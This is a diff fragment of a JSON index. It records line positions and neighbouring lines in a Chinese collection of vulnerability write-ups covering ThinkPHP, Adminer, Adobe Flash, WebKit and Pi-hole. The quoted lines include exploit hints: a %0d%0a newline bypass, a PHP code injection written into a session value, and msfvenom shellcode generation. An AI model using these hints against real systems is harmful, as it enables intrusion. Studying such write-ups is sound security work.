+      "span_start_char": 3527,
+      "previous_nonblank_line": "-   `$data`参数未过滤`%0d%0a`可以用换行来绕过行注释，尝试post数据：",
+      "next_nonblank_line": "![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId27.png)",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 5.0.5 缓存漏洞.md",
+      "line": 57,
+      "span_start_char": 1391,
+      "previous_nonblank_line": "-   漏洞代码与3.2.3差不多，不一样的在缓存目录",
+      "next_nonblank_line": "            {",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 5.0.5 缓存漏洞.md",
+      "line": 78,
+      "span_start_char": 2080,
+      "previous_nonblank_line": "            }",
+      "next_nonblank_line": "![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId25.png)",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/开发框架/ThinkPHP/Thinkphp 6.1 任意文件创建&删除漏洞.md",
+      "line": 73,
+      "span_start_char": 1910,
+      "previous_nonblank_line": "1.  **控制器**",
+      "next_nonblank_line": "        session('name', '<?php phpinfo();?>');#模拟写入内容可控",
+      "context_kind": "before-technical-example"
+    },
+    {
+      "path": "Web安全/数据库/Adminer/Adminer 任意文件读取漏洞.md",
+      "line": 66,
+      "span_start_char": 2086,
+      "previous_nonblank_line": "-   phpmyadmin 开启了远程连接选项，adminer是默认开启的.",
+      "next_nonblank_line": "-   mysql中secure\\_file\\_priv为空，即支持load infile的使用",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/桌面软件/Adobe/（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞.md",
+      "line": 81,
+      "span_start_char": 2433,
+      "previous_nonblank_line": "-   2.利用msfvenom生成对应的shellcode代码",
+      "next_nonblank_line": "![1.png](./.resource/CVE-2018-4878AdobeFlashPlayer远程代码执行漏洞/media/rId24.png)AdobeFlashPlayer远程代码执行漏洞/media/rId24.png)",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/桌面软件/Webkit/（CVE-2018-4441）Webkit shiftCountWithArrayStorage.md",
+      "line": 237,
+      "span_start_char": 7926,
+      "previous_nonblank_line": "-   itemCount",
+      "next_nonblank_line": "    -   `itemCount < actualDeleteCount` 会调用 shift",
+      "context_kind": "between-list-items"
+    },
+    {
+      "path": "Web安全/运维面板/Pi-hole/（CVE 2020-8816）Pi-hole 远程代码执行漏洞.md",
+      "line": 101,
+      "span_start_char": 2887,
+      "previous_nonblank_line": "-   1、模拟MAC地址",
+      "next_nonblank_line": "根据源码中的validMAC()函数，我们得知程序会对用户输入做一个基本的MAC地址格式判断，只要由12个字母或数字组成，就可以通过验证。",
+      "context_kind": "other-block-separator"
+    },
+    {
+      "path": "Web安全/运维面板/Pi-hole/（CVE 2020-8816）Pi-hole 远程代码执行漏洞.md",
+      "line": 110,
+      "span_start_char": 3020,
+      "previous_nonblank_line": "-   2、获取p,h,r的小写字符",
+      "next_nonblank_line": "原本的payload应该为：",
+      "context_kind": "other-block-separator"
+    }
+  ]
+}
